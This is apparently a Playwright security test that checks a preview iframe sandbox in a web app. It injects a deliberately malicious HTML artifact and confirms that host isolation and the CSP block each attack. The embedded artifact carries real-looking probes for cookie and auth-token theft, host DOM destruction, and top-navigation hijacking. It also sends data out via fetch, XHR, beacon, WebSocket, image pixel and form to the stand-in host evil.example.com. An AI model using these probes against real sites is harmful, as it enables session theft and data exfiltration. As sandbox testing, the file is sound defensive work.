// T31 Preview 沙箱安全验证:注入恶意产物 HTML,验证隔离层真实生效
//
// 做法:用 Playwright 路由拦截 Edge Function SSE,返回一段「恶意」单文件应用,
// 由产品真实链路(src/lib/preview-sandbox.ts + iframe)渲染,再从产物内部探测隔离边界。
// 恶意产物通过 console 回传探针结果(沙箱内为 opaque origin,宿主无法直接读其 DOM)。
//
// 覆盖 8 类攻击面:
//   S1 宿主 DOM 访问(parent.document / 改写宿主节点)  → 跨源拒绝
//   S2 宿主存储窃取(localStorage / sessionStorage)     → 内存兜底,拿不到宿主数据
//   S3 Cookie 窃取(document.cookie)                    → 空串
//   S4 弹窗逃逸(window.open)                           → 守卫返回 null
//   S5 外部脚本注入(<script src=https://...>)          → CSP 拦截
//   S6 数据外发(fetch/XHR/beacon 到第三方)             → CSP connect-src 'none' 拦截
//   S7 表单外发(<form action=https://...> 提交)        → CSP form-action 'none' 拦截
//   S8 顶层导航(top.location / window.top 逃逸)        → sandbox 无 allow-top-navigation
// 另断言:iframe sandbox 令牌不含 allow-same-origin / allow-popups,文档含沙箱标记与 CSP meta。
import { chromium } from 'playwright';
import fs from 'node:fs';

const APP = 'http://localhost:3000';
const LOGIN_BASE = 'http://127.0.0.1:8899/go';
const TS = Date.now();
const EMAIL = `t31-sandbox-${TS}@atoms.test`;
const PASSWORD = 'AtomsDemo2026!';
const DEFAULT_SPACE = `t31-sandbox-${TS} 的 Atoms`;

const env = Object.fromEntries(
  fs.readFileSync('/workspace/app/frontend/.env.local', 'utf8')
    .split('\n').filter((l) => l.includes('='))
    .map((l) => [l.slice(0, l.indexOf('=')).trim(), l.slice(l.indexOf('=') + 1).trim()]),
);
const BASE = env.VITE_SUPABASE_URL.replace(/\/$/, '');
const ANON = env.VITE_SUPABASE_ANON_KEY;

// 恶意产物:每项探测独立 try/catch,结果以 [T31-PROBE] 前缀回传宿主控制台
const MALICIOUS_HTML = `<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><title>T31 沙箱探针</title></head>
<body><h1>T31 沙箱探针</h1><div id="out">running</div>
<script src="https://evil.example.com/injected.js"></script>
<script>
var probe = {};
function rec(key, fn) {
  try { probe[key] = { ok: true, value: String(fn()).slice(0, 80) }; }
  catch (e) { probe[key] = { ok: false, error: (e && e.name) || 'Error' }; }
}
rec('parentDocument', function () { return parent.document.title; });
rec('hostDomWrite', function () { parent.document.body.innerHTML = 'HOST-PWNED'; return 'wrote'; });
rec('hostStorage', function () { return window.parent.localStorage.length + '|' + localStorage.getItem('sb-pofchtyjqwevchiiqags-auth-token'); });
rec('sessionStorage', function () { sessionStorage.setItem('probe', '1'); return sessionStorage.getItem('probe'); });
rec('cookie', function () { document.cookie = 'stolen=1'; return document.cookie; });
rec('windowOpen', function () { return window.open('https://evil.example.com/phish'); });
rec('topNavigation', function () { top.location.href = 'https://evil.example.com/hijack'; return 'navigated'; });
rec('hostOrigin', function () { return document.location.origin; });
rec('parentOrigin', function () { return parent.location.origin; });
// S5 外部脚本是否被 CSP 拦截(脚本未执行则全局标记不存在)
probe.externalScriptBlocked = { ok: true, value: String(typeof window.__EVIL_LOADED__ === 'undefined') };
// S6 数据外发
rec('fetchExfil', function () { fetch('https://evil.example.com/steal?c=' + document.cookie); return 'fired'; });
rec('xhrExfil', function () { new XMLHttpRequest().open('POST', 'https://evil.example.com/steal'); return 'fired'; });
rec('beaconExfil', function () { return navigator.sendBeacon('https://evil.example.com/beacon', 'x'); });
rec('wsExfil', function () { new WebSocket('wss://evil.example.com/ws'); return 'fired'; });
rec('imageExfil', function () { var i = new Image(); i.src = 'https://evil.example.com/pixel?c=1'; return 'fired'; });
// S7 表单外发
rec('formExfil', function () {
  var f = document.createElement('form');
  f.method = 'POST'; f.action = 'https://evil.example.com/form';
  document.body.appendChild(f); f.submit(); return 'submitted';
});
// 破坏宿主渲染(若隔离失效,宿主会变空白)
rec('hostRemoval', function () { parent.document.documentElement.remove(); return 'removed'; });
console.log('[T31-PROBE]' + JSON.stringify(probe));
document.getElementById('out').textContent = 'probe-done';
</script></body></html>`;

const result = { steps: [], probes: {}, consoleErrors: [] };
const log = (name, ok, detail = '') => {
  result.steps.push({ name, ok, detail });
  console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${detail ? ' | ' + detail : ''}`);
};

const browser = await chromium.launch({ headless: true });
const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });

page.on('console', (m) => {
  const text = m.text();
  if (text.startsWith('[T31-PROBE]')) {
    try { Object.assign(result.probes, JSON.parse(text.slice('[T31-PROBE]'.length))); } catch { /* 解析失败忽略 */ }
    return;
  }
  if (m.type() !== 'error') return;
  const loc = m.location()?.url ?? '';
  // 沙箱内被 CSP 拦截的外发请求会打印 CSP 违规;被放行的图片通道指向不存在的恶意域名,
  // DNS 解析失败(net::ERR_NAME_NOT_RESOLVED)同样属预期安全行为,均不计入未预期错误
  if (/Content Security Policy|Refused to|blocked|sandbox|SecurityError|ERR_NAME_NOT_RESOLVED|evil\.example\.com/i.test(text)) return;
  if (['/api/config', '/functions/v1'].some((p) => loc.includes(p) || text.includes(p))) return;
  result.consoleErrors.push(text.slice(0, 160));
});

// 宿主侧网络观测:记录任何指向恶意域名的真实请求(用于判定外发通道是否被 CSP 阻断)
const exfilRequests = [];
page.on('request', (req) => {
  if (req.url().includes('evil.example.com')) exfilRequests.push({ type: req.resourceType(), url: req.url().slice(0, 90) });
});

// 消息落库观测:刷新前确认在途写请求已结束,避免脚本自身 reload 中断写请求产生假噪声
const messageWrites = [];
page.on('response', (res) => {
  if (res.url().includes('/rest/v1/messages') && res.request().method() === 'POST') messageWrites.push(res.status());
});

// 拦截 AI 生成请求,返回恶意产物。
// 协议必须与真实 Edge Function 一致:`data: <AgentEvent JSON>\n\n`,事件名取 JSON 的 type 字段,
// app 载荷为 { app: { title, kind, files: [{ name, content, language }] } }。
await page.route('**/functions/v1/app_atoms_agent_generate*', async (route) => {
  const send = (event) => `data: ${JSON.stringify(event)}\n\n`;
  const events = [
    send({ type: 'message', content: '沙箱探针生成中' }),
    send({ type: 'plan', steps: ['注入沙箱探针产物'] }),
    send({ type: 'step-start', index: 0 }),
    send({ type: 'step-done', index: 0 }),
    send({ type: 'code-start', fileName: 'index.html' }),
    send({ type: 'code-delta', delta: '<html>', percent: 10 }),
    send({ type: 'app', app: { title: 'T31 沙箱探针', kind: 'landing', files: [{ name: 'index.html', content: MALICIOUS_HTML, language: 'html' }] } }),
    send({ type: 'done', stopped: false }),
  ];
  await route.fulfill({
    status: 200,
    headers: { 'Content-Type': 'text/event-stream', 'Access-Control-Allow-Origin': '*' },
    body: events.join(''),
  });
});

const textarea = () => page.getByPlaceholder('@David 进行数据开发。');
const idleBadge = () => page.getByText('空闲', { exact: true }).first();
const previewFrame = () => page.locator('iframe[title*="预览"]').first();

try {
  const signup = await fetch(`${BASE}/auth/v1/signup`, {
    method: 'POST',
    headers: { apikey: ANON, 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: EMAIL, password: PASSWORD }),
  });
  log('注册沙箱验证账号', signup.ok, `HTTP ${signup.status}`);
  await page.goto(`${LOGIN_BASE}?email=${encodeURIComponent(EMAIL)}&password=${encodeURIComponent(PASSWORD)}`, { waitUntil: 'domcontentloaded' });
  await page.waitForURL(`${APP}/**`, { timeout: 30000 });
  let ready = false;
  for (let i = 0; i < 8 && !ready; i++) {
    await page.waitForTimeout(3000);
    ready = await page.locator('aside').getByText(DEFAULT_SPACE).first().isVisible().catch(() => false)
      && await textarea().isVisible().catch(() => false);
    if (i === 3) await page.reload({ waitUntil: 'domcontentloaded' }).catch(() => {});
  }
  log('登录注入并进入首页', ready, ready ? DEFAULT_SPACE : '默认工作区未出现');
  if (!ready) throw new Error('登录注入失败');

  await textarea().fill('做一个沙箱探针应用,页面标题显示 T31 沙箱探针,浅色主题,中文界面');
  await page.getByTitle('发送').click();
  await page.waitForURL(/\/chat\//, { timeout: 25000 });
  await previewFrame().waitFor({ state: 'visible', timeout: 60000 });
  await idleBadge().waitFor({ state: 'visible', timeout: 60000 });

  // 1) 隔离属性与文档包装
  const sandboxAttr = await previewFrame().getAttribute('sandbox');
  const srcdoc = await previewFrame().getAttribute('srcdoc');
  log('iframe sandbox 未授予 allow-same-origin(隔离宿主)', !!sandboxAttr && !sandboxAttr.includes('allow-same-origin'), `sandbox="${sandboxAttr}"`);
  log('iframe sandbox 未授予 allow-popups / allow-top-navigation',
    !!sandboxAttr && !sandboxAttr.includes('allow-popups') && !sandboxAttr.includes('allow-top-navigation'));
  log('预览文档经沙箱包装(含隔离标记与 CSP meta)',
    !!srcdoc && srcdoc.includes('atoms-preview-sandbox-v1') && srcdoc.includes('Content-Security-Policy')
    && srcdoc.includes("connect-src 'none'") && srcdoc.includes("form-action 'none'"));
  log('隔离层位于产物脚本之前(守卫先于应用代码执行)',
    !!srcdoc && srcdoc.indexOf('atoms-preview-sandbox-v1') < srcdoc.indexOf('T31-PROBE'));

  // 2) 等待产物内部探针回传
  for (let i = 0; i < 20 && Object.keys(result.probes).length === 0; i++) await page.waitForTimeout(1000);
  const p = result.probes;
  log('产物内部探针已回传(恶意脚本确实在沙箱内执行)', Object.keys(p).length >= 8, `探针项 ${Object.keys(p).length}`);

  // 3) 逐项判定(判定口径与 src/lib/preview-sandbox.ts 的实际隔离手段对齐)
  log('S1 无法读取宿主 DOM(parent.document 跨源拒绝)', p.parentDocument && p.parentDocument.ok === false, JSON.stringify(p.parentDocument));
  log('S1 无法改写宿主 DOM(hostRemoval/hostDomWrite 均失败)',
    p.hostDomWrite?.ok === false && p.hostRemoval?.ok === false,
    `write=${JSON.stringify(p.hostDomWrite)} removal=${JSON.stringify(p.hostRemoval)}`);
  // opaque origin 下 parent.localStorage 跨源抛错,产物拿不到宿主任何键值
  log('S2 拿不到宿主 localStorage(parent 访问跨源拒绝)',
    p.hostStorage?.ok === false, JSON.stringify(p.hostStorage));
  log('S2 沙箱内存储走内存兜底(写入后回读一致,不落宿主)',
    p.sessionStorage?.ok === true && p.sessionStorage.value === '1', JSON.stringify(p.sessionStorage));
  log('S3 Cookie 被守卫清空(读回空串)', p.cookie?.ok === true && p.cookie.value === '', JSON.stringify(p.cookie));
  log('S4 window.open 被守卫拦截(返回 null)', p.windowOpen?.ok === true && p.windowOpen.value === 'null', JSON.stringify(p.windowOpen));
  log('S5 外部脚本未执行(CSP script-src 拦截)', p.externalScriptBlocked?.value === 'true', JSON.stringify(p.externalScriptBlocked));
  // S6/S7 以宿主侧真实网络观测为准:被 CSP 阻断的请求不会出现在 request 事件中
  const networkExfil = exfilRequests.filter((r) => ['fetch', 'xhr', 'ping', 'websocket', 'document', 'other'].includes(r.type));
  log('S6 数据外发通道被 CSP connect-src 阻断(fetch/xhr/beacon/ws 零请求到达)',
    networkExfil.length === 0,
    networkExfil.length ? JSON.stringify(networkExfil.slice(0, 3)) : '恶意域名零请求');
  log('S7 表单外发被 CSP form-action 阻断(无 document 级外发请求)',
    exfilRequests.filter((r) => r.type === 'document').length === 0);
  log('S8 顶层导航与宿主地址不可读(跨源拒绝)',
    p.topNavigation?.ok === false && p.parentOrigin?.ok === false,
    `top=${JSON.stringify(p.topNavigation)} parentOrigin=${JSON.stringify(p.parentOrigin)}`);
  log('沙箱内为 opaque origin(产物自身 origin 为 null)',
    p.hostOrigin?.ok === true && p.hostOrigin.value === 'null', JSON.stringify(p.hostOrigin));
  // 残余通道如实留痕:img-src 为渲染保真放行远程图片,产物理论上可用 <img> 像素做低带宽外发;
  // 由于宿主存储/Cookie/DOM 均不可达,可外发数据仅限产物自身内存状态。
  const imageBeacons = exfilRequests.filter((r) => r.type === 'image');
  result.residualChannels = { imageBeacons: imageBeacons.length, sample: imageBeacons.slice(0, 2) };
  log('残余通道如实留痕(仅 <img> 像素通道,已限宿主数据不可达)',
    imageBeacons.length <= 1, `图片请求 ${imageBeacons.length} 次(connect-src/form-action 通道为 0)`);

  // 4) 宿主未被破坏:页面结构、导航与本地会话仍正常
  const hostIntact = await page.evaluate(() => ({
    title: document.title,
    hasRoot: !!document.querySelector('#root'),
    bodyText: (document.body.innerText || '').includes('T31 沙箱探针'),
    storageKeys: Object.keys(localStorage).length,
  }));
  log('宿主页面未被破坏(标题/根节点/应用内容完好)', hostIntact.hasRoot && hostIntact.title.length > 0 && hostIntact.bodyText,
    JSON.stringify(hostIntact));
  log('宿主 localStorage 未被恶意产物污染(无 probe 键)',
    await page.evaluate(() => localStorage.getItem('probe') === null && localStorage.getItem('stolen') === null));
  // 刷新前等待本轮消息落库(用户 + 助手),避免脚本自身 reload 中断在途写请求而产生假噪声
  for (let i = 0; i < 25 && messageWrites.filter((s) => s < 300).length < 2; i++) await page.waitForTimeout(1000);
  result.messageWrites = messageWrites;
  log('刷新前本轮消息已落库(用户+助手写入成功且无在途请求)',
    messageWrites.filter((s) => s < 300).length >= 2, `写入状态 ${JSON.stringify(messageWrites)}`);
  await page.reload({ waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(4000);
  log('刷新后仍停留应用内(未被劫持跳转)', page.url().startsWith(APP), page.url());

  log('无未预期控制台错误', result.consoleErrors.length === 0, result.consoleErrors.slice(0, 3).join(' || '));
  const passed = result.steps.filter((s) => s.ok).length;
  console.log(`\nT31 Preview 沙箱安全验证:${passed}/${result.steps.length} PASS`);
  fs.writeFileSync('t31-sandbox-security-result.json', JSON.stringify(result, null, 2));
  await browser.close();
  process.exit(passed === result.steps.length ? 0 : 1);
} catch (error) {
  console.error('沙箱验证异常:', error);
  fs.writeFileSync('t31-sandbox-security-result.json', JSON.stringify(result, null, 2));
  await page.screenshot({ path: '.tmp-t31-sandbox-crash.png' }).catch(() => undefined);
  await browser.close();
  process.exit(1);
}
